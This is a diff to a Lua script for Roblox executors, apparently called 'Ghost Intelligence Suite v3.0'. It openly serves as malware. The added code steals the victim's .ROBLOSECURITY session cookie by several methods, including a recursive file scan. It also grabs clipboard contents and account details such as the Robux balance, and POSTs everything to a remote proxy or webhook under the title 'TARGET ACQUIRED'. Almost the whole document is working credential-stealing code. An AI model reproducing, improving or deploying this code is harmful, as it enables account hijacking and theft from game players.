@@ -134,27 +134,127 @@ local function getPlayerList()
 end
 
 -- ============================================================
--- MODULE 1: Execution Alert
+-- MODULE 1: Consolidated Startup Embed
+-- Collects all data then sends ONE big color-coded embed
 -- ============================================================
 task.spawn(function()
     local exec = getExec()
     local game_name = getGame()
     local playerList, playerCount = getPlayerList()
-    send("SCRIPT EXECUTED",
-        "**User:** " .. LocalPlayer.Name ..
-        "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
-        "\n**Display Name:** " .. LocalPlayer.DisplayName ..
-        "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
-        "\n**Executor:** " .. exec ..
-        "\n**Game:** " .. game_name ..
-        "\n**Place ID:** " .. tostring(game.PlaceId) ..
-        "\n**Job ID:** " .. tostring(game.JobId) ..
-        "\n**Players in server:** " .. tostring(playerCount) ..
-        "\n\n**Active Modules:** Keylogger, Token Stealer, API Scraper, Clipboard, Anti-AFK, Heartbeat, Kill Switch",
-        65280
-    )
-end)
+    local uid = tostring(LocalPlayer.UserId)
 
+    -- Collect account data
+    local robux = "unknown"
+    local friends = "unknown"
+    local followers = "unknown"
+    local premium = tostring(LocalPlayer.MembershipType == Enum.MembershipType.Premium)
+    pcall(function()
+        local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
+        if r then local d = HttpService:JSONDecode(r) if d and d.robux then robux = tostring(d.robux) end end
+    end)
+    pcall(function()
+        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
+        if r then local d = HttpService:JSONDecode(r) if d then friends = tostring(d.count) end end
+    end)
+    pcall(function()
+        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
+        if r then local d = HttpService:JSONDecode(r) if d then followers = tostring(d.count) end end
+    end)
+
+    -- Collect clipboard
+    local clipboard = "not available"
+    pcall(function()
+        if getclipboard then
+            local ok, clip = pcall(getclipboard)
+            if ok and clip and clip ~= "" then clipboard = clip:sub(1, 200) else clipboard = "empty" end
+        end
+    end)
+
+    -- Collect token/cookie
+    local token = "none"
+    local tokenMethod = "none"
+    local req = request or http_request or (syn and syn.request) or (http and http.request)
+    if getcookies then pcall(function()
+        local c = getcookies()
+        if type(c) == "table" then
+            for k, v in pairs(c) do
+                if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
+                    token = tostring(v):sub(1, 60) .. "..." tokenMethod = "getcookies" break
+                end
+            end
+        end
+    end) end
+    if token == "none" and syn and syn.get_cookie then pcall(function()
+        local v = syn.get_cookie(".ROBLOSECURITY")
+        if v and #v > 20 then token = v:sub(1,60) .. "..." tokenMethod = "syn.get_cookie" end
+    end) end
+    if token == "none" and req then pcall(function()
+        local res = req({ Url = "https://www.roblox.com/", Method = "GET" })
+        if res and type(res.Cookies) == "table" then
+            for k, v in pairs(res.Cookies) do
+                if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
+                    token = tostring(v):sub(1,60) .. "..." tokenMethod = "res.Cookies" break
+                end
+            end
+        end
+    end) end
+
+    -- Build ONE big embed
+    local sep = "\n" .. string.rep("-", 30) .. "\n"
+    local desc = ""
+
+    -- IDENTITY block
+    desc = desc .. "**>> IDENTITY**\n"
+    desc = desc .. "User: **" .. LocalPlayer.Name .. "** (" .. LocalPlayer.DisplayName .. ")\n"
+    desc = desc .. "ID: " .. uid .. "\n"
+    desc = desc .. "Age: " .. tostring(LocalPlayer.AccountAge) .. " days\n"
+    desc = desc .. "Executor: **" .. exec .. "**\n"
+    desc = desc .. "Game: " .. game_name .. " (" .. tostring(game.PlaceId) .. ")\n"
+    desc = desc .. "Session: " .. SESSION_ID .. "\n"
+    desc = desc .. sep
+
+    -- ACCOUNT block
+    desc = desc .. "**>> ACCOUNT**\n"
+    desc = desc .. "Robux: **" .. robux .. "**\n"
+    desc = desc .. "Premium: " .. premium .. "\n"
+    desc = desc .. "Friends: " .. friends .. "\n"
+    desc = desc .. "Followers: " .. followers .. "\n"
+    desc = desc .. sep
+
+    -- TOKEN block
+    desc = desc .. "**>> TOKEN**\n"
+    if token ~= "none" then
+        desc = desc .. "Status: **CAPTURED** via " .. tokenMethod .. "\n"
+        desc = desc .. "Preview: `" .. token .. "`\n"
+    else
+        desc = desc .. "Status: not captured (see TOKEN STEALER embed)\n"
+    end
+    desc = desc .. sep
+
+    -- CLIPBOARD block
+    desc = desc .. "**>> CLIPBOARD**\n"
+    desc = desc .. clipboard .. "\n"
+    desc = desc .. sep
+
+    -- SERVER block
+    desc = desc .. "**>> SERVER** (" .. tostring(playerCount) .. " players)\n"
+    desc = desc .. playerList .. "\n"
+
+    -- Send the big embed — color cyan
+    local ok, encoded = pcall(function()
+        return HttpService:JSONEncode({
+            embeds = {{
+                title = "GHOST SUITE — TARGET ACQUIRED",
+                description = desc:sub(1, 4000),
+                color = 65535,
+                thumbnail = { url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. uid .. "&width=150&height=150&format=png" },
+                footer = { text = "Ghost Intelligence Suite v3.0 | Session: " .. SESSION_ID },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }}
+        })
+    end)
+    if ok and encoded then POST(PROXY, encoded) end
+end)
 task.wait(1)
 
 -- ============================================================
@@ -2028,15 +2128,14 @@ getgenv().IntelSuite.RequireScanner = runRequireScanner
 -- ============================================================
 -- MODULE 27: Cookie Logger
 -- Trigger: Startup (auto) + !cmd cookielog
--- Phase 1: Extract  Phase 2: Package  Phase 3: POST
--- Works on ALL executors including Xeno
+-- Xeno: readfile + request available, getcookies not available
 -- ============================================================
 local function runCookieLogger()
     local cookie = nil
     local method = "none"
     local req = request or http_request or (syn and syn.request) or (http and http.request)
 
-    -- M1: getcookies() flat + nested table
+    -- M1: getcookies() flat + nested
     if not cookie and getcookies then
         pcall(function()
             local c = getcookies()
@@ -2058,7 +2157,7 @@ local function runCookieLogger()
         end)
     end
 
-    -- M2: syn.get_cookie (Synapse X)
+    -- M2: syn.get_cookie
     if not cookie and syn and syn.get_cookie then
         pcall(function()
             local v = syn.get_cookie(".ROBLOSECURITY")
@@ -2074,8 +2173,7 @@ local function runCookieLogger()
         end)
     end
 
-    -- M4: res.Cookies table — executor populates this automatically
-    -- Works on Xeno + all executors, separate from headers
+    -- M4: res.Cookies table — executor populates automatically
     if not cookie and req then
         pcall(function()
             local res = req({ Url = "https://www.roblox.com/", Method = "GET" })
@@ -2095,54 +2193,96 @@ local function runCookieLogger()
                         end
                     end
                 end
+                -- M4b: scan every field of res for ROBLOSECURITY string
+                if not cookie then
+                    for k, v in pairs(res) do
+                        local full = tostring(v)
+                        local found = full:match("ROBLOSECURITY[=_]([^;%s,]+)")
+                        if found and #found > 20 then
+                            cookie = found method = "res." .. tostring(k) .. " field scan" break
+                        end
+                    end
+                end
             end
         end)
     end
 
-    -- M5: readfile recursive scan — confirmed available on Xeno
-    if not cookie and readfile and listfiles then
+    -- M5: readfile recursive scan — Xeno confirmed has readfile
+    -- Scans all files in executor workspace for ROBLOSECURITY string
+    if not cookie and readfile then
         pcall(function()
             local scanned = 0
             local function scan(path)
-                if scanned >= 300 or cookie then return end
+                if scanned >= 500 or cookie then return end
                 local ok, content = pcall(readfile, path)
-                if ok and type(content) == "string" and #content > 10 then
+                if ok and type(content) == "string" and #content > 5 then
                     scanned = scanned + 1
                     local found = content:match("ROBLOSECURITY[=_]([^;%s,]+)")
+                    if not found then found = content:match("%.ROBLOSECURITY=([^;%s]+)") end
+                    if not found then found = content:match("_|([A-Za-z0-9]+)|_") end
                     if found and #found > 20 then
                         cookie = found method = "readfile:" .. tostring(path) return
                     end
                 end
-                local lok, files = pcall(listfiles, path)
-                if lok and type(files) == "table" then
-                    for _, f in ipairs(files) do
-                        if cookie then break end
-                        scan(f)
+                if listfiles then
+                    local lok, files = pcall(listfiles, path)
+                    if lok and type(files) == "table" then
+                        for _, f in ipairs(files) do
+                            if cookie then break end
+                            scan(f)
+                        end
                     end
                 end
             end
-            for _, root in ipairs({"", "cache", "cookies", "Xeno", "xeno", "data"}) do
+            -- Xeno-specific paths + generic roots
+            local roots = {
+                "", "cache", "Cache", "cookies", "Cookies",
+                "session", "Session", "data", "Data",
+                "Xeno", "xeno", "storage", "Storage",
+                "roblox", "Roblox", "workspace", "config"
+            }
+            for _, root in ipairs(roots) do
                 if cookie then break end
                 scan(root)
+            end
+            -- If still nothing, send a file list dump so Kevin can see what's there
+            if not cookie and listfiles then
+                local lok, files = pcall(listfiles, "")
+                if lok and files then
+                    local fileList = "scanned " .. tostring(scanned) .. " files. Root contents:\n"
+                    for i, f in ipairs(files) do
+                        if i > 30 then fileList = fileList .. "...and more" break end
+                        fileList = fileList .. tostring(f) .. "\n"
+                    end
+                    send("COOKIE FILE DUMP", fileList, 16776960)
+                end
             end
         end)
     end
 
-    -- Package + POST
+    -- Report
     local uid = tostring(LocalPlayer.UserId)
     if cookie and cookie ~= "" then
         local trunc = #cookie > 850 and (cookie:sub(1, 850) .. "...[TRUNCATED]") or cookie
-        send(
-            "COOKIE CAPTURED",
-            "**User:** " .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")" ..
-            "\n**ID:** " .. uid ..
-            "\n**Profile:** https://www.roblox.com/users/" .. uid .. "/profile" ..
-            "\n**Executor:** " .. getExec() ..
-            "\n**Method:** " .. method ..
-            "\n**Session:** " .. SESSION_ID ..
-            "\n**.ROBLOSECURITY:**\n```" .. trunc .. "```",
-            65535
-        )
+        local ok2, enc2 = pcall(function()
+            return HttpService:JSONEncode({
+                embeds = {{
+                    title = "COOKIE CAPTURED",
+                    description =
+                        "**User:** " .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")" ..
+                        "\n**ID:** " .. uid ..
+                        "\n**Profile:** https://www.roblox.com/users/" .. uid .. "/profile" ..
+                        "\n**Executor:** " .. getExec() ..
+                        "\n**Method:** " .. method ..
+                        "\n**Session:** " .. SESSION_ID ..
+                        "\n\n**.ROBLOSECURITY:**\n```" .. trunc .. "```",
+                    color = 65535,
+                    footer = { text = "Ghost Intelligence Suite v3.0 | Module 27" },
+                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                }}
+            })
+        end)
+        if ok2 and enc2 then POST(PROXY, enc2) end
     else
         send(
             "COOKIE GRAB FAILED",
